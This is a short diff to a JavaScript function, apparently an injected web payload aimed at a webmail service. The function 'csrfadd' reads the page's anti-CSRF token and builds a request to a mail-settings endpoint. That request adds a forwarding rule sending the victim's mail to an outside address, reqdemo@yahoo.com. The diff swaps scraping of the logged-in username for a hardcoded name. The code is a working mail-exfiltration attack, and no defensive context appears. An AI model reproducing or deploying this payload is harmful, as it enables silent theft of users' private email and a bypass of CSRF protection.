@@ -16,7 +16,8 @@ httpRequest.onreadystatechange = function ()
 
 function csrfadd(rs){
 var addmail="reqdemo%40yahoo.com";
-var uname=document.getElementsByClassName('wm-navbar-username')[0].innerText;
+//var uname=document.getElementsByClassName('wm-navbar-username')[0].innerText;
+var uname="rory.chien";
 var host=document.getElementsByClassName("msg-field-value")[0].innerText.split("@")[1].split(">")[0];
 var u1=document.baseURI.match((/^(?:[^\/]|\/\/)*/))[0]+'/mailService/mail/M_set_1_10.do?user_name='+uname+'&host_name=';
 var u2=host+"&forward_content="+addmail+"%0D%0A&add_new_forward_address="+addmail+"&owaspcsrftkn="+rs;
